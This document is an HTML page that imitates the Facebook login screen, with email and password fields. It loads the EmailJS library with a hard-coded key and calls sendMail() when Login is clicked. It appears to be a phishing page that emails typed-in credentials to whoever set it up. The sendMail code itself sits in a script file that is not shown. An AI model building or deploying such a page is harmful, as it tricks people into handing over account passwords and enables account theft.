<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page | CodingNepal</title>
    <link rel="stylesheet" href="style.css">


    <script src="index.js"></script>

    <script
    type="text/javascript"
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
    ></script>
    <script type="text/javascript">
    (function () {
        emailjs.init("YUbCtK8m7ajZNSZ4r");
    })();
    </script>
</head>

<body>
    <div class="container flex">
        <div class="facebook-page flex">
            <div class="text">
                <h1>facebook</h1>
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>
            <form action="#">
                <input type="email" id="email" placeholder="Email or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <div class="link">
                    <button type="submit" class="login" onclick="sendMail()">Login</button>
                    <a href="#" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <div class="button">
                    <a href="#" >Create new account</a>
                </div>
            </form>
        </div>
    </div>
</body>

</html>
